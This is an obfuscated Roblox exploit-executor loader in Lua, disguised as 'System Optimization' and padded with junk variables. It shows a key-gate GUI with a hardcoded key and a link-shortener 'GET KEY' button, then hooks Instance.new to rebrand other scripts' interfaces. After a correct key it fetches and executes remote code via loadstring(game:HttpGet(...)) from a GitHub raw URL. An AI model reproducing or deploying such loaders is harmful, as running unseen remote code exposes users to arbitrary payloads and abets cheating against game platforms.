
--// System Optimization v4.39
local xDJzAnmP = 42471; -- junk var
local DzAOPvVZ = 85145; -- junk var
local gWzrlVoy = 15661; -- junk var
local pQKdInOL = 74985; -- junk var
local rQFmTVpk = 41255; -- junk var
local lwFWOXGp = 62280; -- junk var
local FiVNvaZW = 59947; -- junk var
local CbMGuyiS = 92329; -- junk var
local yWgfbVcj = 57536; -- junk var
local ayvKcBsF = 84840; -- junk var
local OfliFYem = 97287; -- junk var
local CnjFiJnk = 45680; -- junk var
local qmFtYIgb = 37866; -- junk var
local YbsRceSW = 60203; -- junk var
local QnLhJZGj = 65850; -- junk var
local urfaZXLl = 59247; -- junk var
local aaPaErer = 7684; -- junk var
local LdBCufkW = 24750; -- junk var
local bncFcSJF = 59151; -- junk var
local tMixLTfW = 26034; -- junk var
local OtRiFxPN = 76067; -- junk var

--// MAIN EXECUTION START
task.spawn(function()
    local s, e = pcall(function()
        --[[ Secured by Lamperuz Auto | ID: e2d12018344a4b74b1f912a58dbdb859 ]]
local _k = {108, 97, 109, 112, 101, 114, 117, 122, 49, 50, 51}
local CoreGui = game:GetService("CoreGui")
if CoreGui:FindFirstChild("SfaJcb") then CoreGui["SfaJcb"]:Destroy() end

local SfaJcb = Instance.new("ScreenGui", CoreGui)
SfaJcb.Name = "SfaJcb"
local vIlRVdc = Instance.new("Frame", SfaJcb)
local sMzgZOTk = Instance.new("TextBox", vIlRVdc)

vIlRVdc.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
vIlRVdc.BorderSizePixel = 0
vIlRVdc.Position = UDim2.new(0.5, -175, 0.5, -100)
vIlRVdc.Size = UDim2.new(0, 350, 0, 200)
vIlRVdc.Active = true
vIlRVdc.Draggable = true
Instance.new("UICorner", vIlRVdc).CornerRadius = UDim.new(0, 8)

local tit = Instance.new("TextLabel", vIlRVdc)
tit.Size = UDim2.new(1, 0, 0, 45)
tit.BackgroundTransparency = 1
tit.Text = "SECURITY CHECK"
tit.TextColor3 = Color3.new(1,1,1)
tit.Font = Enum.Font.GothamBold
tit.TextSize = 18

sMzgZOTk.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
sMzgZOTk.Position = UDim2.new(0.1, 0, 0.35, 0)
sMzgZOTk.Size = UDim2.new(0.8, 0, 0, 38)
sMzgZOTk.PlaceholderText = "Enter Key..."
sMzgZOTk.Text = ""
sMzgZOTk.TextColor3 = Color3.new(1,1,1)
sMzgZOTk.Font = Enum.Font.Gotham
Instance.new("UICorner", sMzgZOTk)

local b_log = Instance.new("TextButton", vIlRVdc)
local b_get = Instance.new("TextButton", vIlRVdc)

local function style_btn(b, p, t, c)
    b.Position = p
    b.Size = UDim2.new(0.38, 0, 0, 38)
    b.Text = t
    b.BackgroundColor3 = c
    b.TextColor3 = Color3.new(1,1,1)
    b.Font = Enum.Font.GothamBold
    Instance.new("UICorner", b)
end

style_btn(b_log, UDim2.new(0.1, 0, 0.65, 0), "LOGIN", Color3.fromRGB(122, 198, 182))
style_btn(b_get, UDim2.new(0.52, 0, 0.65, 0), "GET KEY", Color3.fromRGB(60, 60, 60))

b_get.MouseButton1Click:Connect(function()
    setclipboard("https://link-center.net/2628650/0udtrz0wIh7A")
    b_get.Text = "COPIED"
    task.wait(1.5)
    b_get.Text = "GET KEY"
end)

b_log.MouseButton1Click:Connect(function()
    local inp = sMzgZOTk.Text:gsub("%s+", "")
    if #inp ~= #_k then b_log.Text = "BAD KEY" task.wait(1) b_log.Text = "LOGIN" return end
    
    local v = true
    for i=1, #inp do if string.byte(inp, i) ~= _k[i] then v = false end end
    
    if v then
        b_log.Text = "SUCCESS"
        task.wait(0.5)
        SfaJcb:Destroy()
        
        -- ЗАПУСК УНИКАЛИЗАТОРА И ЦЕЛЕВОГО СКРИПТА
        
        -- === [ LAMPERUZ UNIQUEIZER START ] ===
        local MY_NAME = "Void Software"
        local ACCENT_COLOR = Color3.fromRGB(122, 198, 182) 
        
        local oldInstanceNew = Instance.new
        
        local function newInstanceHook(class, parent)
            local obj = oldInstanceNew(class, parent)
            task.spawn(function()
                task.wait() 
                -- 1. Подмена текста
                if obj:IsA("TextLabel") or obj:IsA("TextButton") then
                    if #obj.Text > 3 or obj.Text:find("Hub") then
                        if obj.Size.Y.Offset > 15 or obj.Name:find("Title") then
                            obj.Text = MY_NAME
                        end
                    end
                end
                -- 2. Подмена цвета
                if obj:IsA("Frame") or obj:IsA("TextButton") or obj:IsA("ScrollingFrame") then
                    local c = obj.BackgroundColor3
                    if (c.r > 0.1 or c.g > 0.1 or c.b > 0.1) and (c.r < 0.9) then
                        obj.BackgroundColor3 = ACCENT_COLOR
                    end
                end
                -- 3. Подмена обводки
                if obj:IsA("UIStroke") then
                    obj.Color = ACCENT_COLOR
                end
            end)
            return obj
        end
        
        if getgenv then
            getgenv().Instance = {new = newInstanceHook}
        end
        
        -- Запуск целевого скрипта
        local success, err = pcall(function() 
            loadstring(game:HttpGet("https://raw.githubusercontent.com/blackowl1231/Z3US/refs/heads/main/main.lua"))() 
        end)
        if not success then warn("Script Load Error: " .. tostring(err)) end
        -- === [ LAMPERUZ UNIQUEIZER END ] ===
    
    else
        b_log.Text = "WRONG"
        task.wait(1)
        b_log.Text = "LOGIN"
    end
end)

    end)
    if not s then warn("Loader Error: " .. tostring(e)) end
end)
--// MAIN EXECUTION END
--// System Optimization v6.35
local XCJJfBdd = 6937; -- junk var
local VOazPwhC = 13793; -- junk var
local HajioKgD = 13227; -- junk var
local duDaDKqs = 50390; -- junk var
local fdfGPOpj = 85561; -- junk var
local yZqhRMGs = 3829; -- junk var
local dATMguRM = 75691; -- junk var
local ukpvkmXk = 33430; -- junk var
local HYFpLprY = 26347; -- junk var
local nJRYFsWS = 80184; -- junk var
local FzQGvXRr = 65432; -- junk var
local INlbwRXw = 23296; -- junk var
local JApDEENe = 47815; -- junk var
local TOKwtEID = 17827; -- junk var
local gjjILoSK = 26919; -- junk var
local OWtcagxg = 62639; -- junk var
local HuEXUDmr = 53548; -- junk var
local UbkHZKdr = 6277; -- junk var
local fNdzDLDq = 48477; -- junk var
local bWiYRtsK = 32051; -- junk var
local IsKFSUEF = 98464; -- junk var
local ClakFsMz = 34575; -- junk var
local vZPeWhqC = 95751; -- junk var
local HTkmvguh = 60604; -- junk var
local HpHVUnJx = 11505; -- junk var
local fsodLmBP = 44091; -- junk var
local ziWQcmTY = 26249; -- junk var
local zxJyIZNC = 6549; -- junk var
local YknJaXqM = 57727; -- junk var

